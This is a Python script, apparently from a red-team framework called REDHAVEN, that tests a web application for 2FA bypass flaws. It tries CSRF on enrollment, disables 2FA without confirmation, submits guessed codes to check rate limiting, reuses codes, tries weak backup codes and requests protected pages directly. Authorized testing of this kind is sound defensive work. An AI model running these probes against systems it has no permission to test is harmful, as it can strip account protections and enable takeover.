#!/usr/bin/env python3
"""
2FA Bypass Tester - REDHAVEN Framework
Tests common 2FA/MFA bypass vectors and misconfigurations
"""

import sys
import argparse
import requests
import json
import time
from typing import Dict, List

BANNER = """
╔══════════════════════════════════════════════════════════╗
║  2FA BYPASS TESTER - Multi-Factor Authentication         ║
║  Part of REDHAVEN Framework v1.2.2                       ║
╚══════════════════════════════════════════════════════════╝
"""

class TwoFABypassTester:
    def __init__(self, base_url: str, session_cookie: str = None):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        
        if session_cookie:
            self.session.cookies.set('session', session_cookie)
    
    def test_csrf_on_enrollment(self, enrollment_url: str) -> Dict:
        """Test CSRF on 2FA enrollment endpoint."""
        print(f"[*] Testing CSRF on enrollment: {enrollment_url}")
        
        findings = []
        
        try:
            # Test 1: POST without CSRF token
            response = self.session.post(enrollment_url, data={
                'enable_2fa': 'true',
                'phone': '+1234567890'
            })
            
            if response.status_code in [200, 201, 302]:
                findings.append({
                    'type': 'CSRF_ON_ENROLLMENT',
                    'severity': 'HIGH',
                    'description': 'Can enable 2FA without CSRF token'
                })
                print(f"    [!] VULNERABLE: CSRF on enrollment")
            
            # Test 2: Disable 2FA without confirmation
            disable_response = self.session.post(enrollment_url.replace('enable', 'disable'), 
                                                 data={'disable_2fa': 'true'})
            
            if disable_response.status_code in [200, 201, 302]:
                findings.append({
                    'type': 'NO_CONFIRM_ON_DISABLE',
                    'severity': 'CRITICAL',
                    'description': 'Can disable 2FA without confirmation/password'
                })
                print(f"    [!!!] CRITICAL: Can disable 2FA without confirmation")
        
        except Exception as e:
            print(f"    [-] Error: {e}")
        
        return findings
    
    def test_code_bruteforce(self, verify_url: str, code_param: str = 'code') -> Dict:
        """Test if 2FA codes can be brute-forced."""
        print(f"[*] Testing rate limiting on: {verify_url}")
        
        findings = []
        attempts = 0
        blocked = False
        
        try:
            # Attempt 20 invalid codes
            for i in range(20):
                fake_code = str(i).zfill(6)  # 000000, 000001, etc.
                response = self.session.post(verify_url, data={code_param: fake_code})
                attempts += 1
                
                # Check if blocked
                if response.status_code == 429 or 'too many' in response.text.lower():
                    blocked = True
                    print(f"    [+] Rate limiting active (blocked at {attempts} attempts)")
                    break
                
                time.sleep(0.1)  # Small delay
            
            if not blocked:
                findings.append({
                    'type': 'NO_RATE_LIMITING',
                    'severity': 'CRITICAL',
                    'description': f'No rate limiting after {attempts} attempts - brute force possible'
                })
                print(f"    [!!!] VULNERABLE: No rate limiting ({attempts} codes tested)")
        
        except Exception as e:
            print(f"    [-] Error: {e}")
        
        return findings
    
    def test_response_manipulation(self, verify_url: str) -> Dict:
        """Test if response can be manipulated to bypass 2FA."""
        print(f"[*] Testing response manipulation: {verify_url}")
        
        findings = []
        
        try:
            # Submit invalid code
            response = self.session.post(verify_url, data={'code': '000000'})
            
            # Check if response suggests client-side validation
            if 'success' in response.text.lower() and response.status_code == 200:
                # Could be client-side check
                findings.append({
                    'type': 'CLIENT_SIDE_VALIDATION',
                    'severity': 'CRITICAL',
                    'description': 'Response contains success indicators - possible client-side bypass'
                })
                print(f"    [!] Possible client-side validation detected")
            
            # Test JSON manipulation (change "success": false to true)
            try:
                json_resp = response.json()
                if 'success' in json_resp or 'valid' in json_resp:
                    findings.append({
                        'type': 'JSON_RESPONSE_TAMPERING',
                        'severity': 'HIGH',
                        'description': 'JSON response manipulation may bypass 2FA verification'
                    })
                    print(f"    [!] JSON response manipulation vector detected")
            except:
                pass
        
        except Exception as e:
            print(f"    [-] Error: {e}")
        
        return findings
    
    def test_code_reuse(self, verify_url: str, valid_code: str = None) -> Dict:
        """Test if previously used codes can be reused."""
        print(f"[*] Testing code reuse protection")
        
        findings = []
        
        if not valid_code:
            print(f"    [i] Skipping (no valid code provided)")
            return findings
        
        try:
            # Use code first time
            response1 = self.session.post(verify_url, data={'code': valid_code})
            
            # Try to reuse
            time.sleep(1)
            response2 = self.session.post(verify_url, data={'code': valid_code})
            
            if response2.status_code == 200 and 'success' in response2.text.lower():
                findings.append({
                    'type': 'CODE_REUSE',
                    'severity': 'HIGH',
                    'description': '2FA codes can be reused multiple times'
                })
                print(f"    [!!!] VULNERABLE: Code reuse possible")
        
        except Exception as e:
            print(f"    [-] Error: {e}")
        
        return findings
    
    def test_direct_access(self, protected_urls: List[str]) -> Dict:
        """Test if 2FA can be bypassed by directly accessing protected pages."""
        print(f"[*] Testing direct access bypass")
        
        findings = []
        
        for url in protected_urls:
            try:
                response = self.session.get(url)
                
                if response.status_code == 200 and '2fa' not in response.url.lower():
                    findings.append({
                        'type': 'DIRECT_ACCESS_BYPASS',
                        'severity': 'CRITICAL',
                        'description': f'Can access {url} without completing 2FA'
                    })
                    print(f"    [!!!] VULNERABLE: Direct access to {url}")
            except Exception as e:
                print(f"    [-] Error testing {url}: {e}")
        
        return findings
    
    def test_backup_codes(self, verify_url: str) -> Dict:
        """Test backup code security."""
        print(f"[*] Testing backup code security")
        
        findings = []
        
        # Common weak backup codes
        weak_codes = ['12345678', '00000000', 'ABCD1234', 'backup123']
        
        for code in weak_codes:
            try:
                response = self.session.post(verify_url, data={'backup_code': code})
                
                if response.status_code == 200 and 'success' in response.text.lower():
                    findings.append({
                        'type': 'WEAK_BACKUP_CODE',
                        'severity': 'HIGH',
                        'description': f'Weak/predictable backup code accepted: {code}'
                    })
                    print(f"    [!!!] Weak backup code works: {code}")
                    break
            except:
                pass
        
        return findings

def main():
    print(BANNER)
    
    parser = argparse.ArgumentParser(description="2FA Bypass Tester")
    parser.add_argument('-u', '--url', required=True, help='Base URL of the application')
    parser.add_argument('--enrollment', help='2FA enrollment endpoint')
    parser.add_argument('--verify', help='2FA verification endpoint')
    parser.add_argument('--protected', nargs='+', help='Protected URLs to test direct access')
    parser.add_argument('--session', help='Session cookie value')
    parser.add_argument('--valid-code', help='Valid 2FA code for reuse testing')
    parser.add_argument('--all-tests', action='store_true', help='Run all available tests')
    
    args = parser.parse_args()
    
    tester = TwoFABypassTester(args.url, args.session)
    all_findings = []
    
    print(f"[*] Target: {args.url}")
    print("="*70)
    
    if args.enrollment or args.all_tests:
        enrollment_url = args.enrollment or f"{args.url}/settings/2fa/enable"
        findings = tester.test_csrf_on_enrollment(enrollment_url)
        all_findings.extend(findings)
    
    if args.verify or args.all_tests:
        verify_url = args.verify or f"{args.url}/2fa/verify"
        
        # Run all verification tests
        all_findings.extend(tester.test_code_bruteforce(verify_url))
        all_findings.extend(tester.test_response_manipulation(verify_url))
        all_findings.extend(tester.test_backup_codes(verify_url))
        
        if args.valid_code:
            all_findings.extend(tester.test_code_reuse(verify_url, args.valid_code))
    
    if args.protected:
        all_findings.extend(tester.test_direct_access(args.protected))
    
    # Report
    print("\n" + "="*70)
    if all_findings:
        critical = [f for f in all_findings if f['severity'] == 'CRITICAL']
        high = [f for f in all_findings if f['severity'] == 'HIGH']
        
        print(f"[+] FOUND {len(all_findings)} 2FA BYPASS VULNERABILITIES")
        print("="*70)
        
        if critical:
            print(f"\n[!!!] CRITICAL ({len(critical)}):")
            for f in critical:
                print(f"  >> {f['type']}: {f['description']}")
        
        if high:
            print(f"\n[!] HIGH ({len(high)}):")
            for f in high:
                print(f"  >> {f['type']}: {f['description']}")
    else:
        print("[-] No 2FA bypass vulnerabilities detected")
    
    print("="*70)

if __name__ == '__main__':
    main()
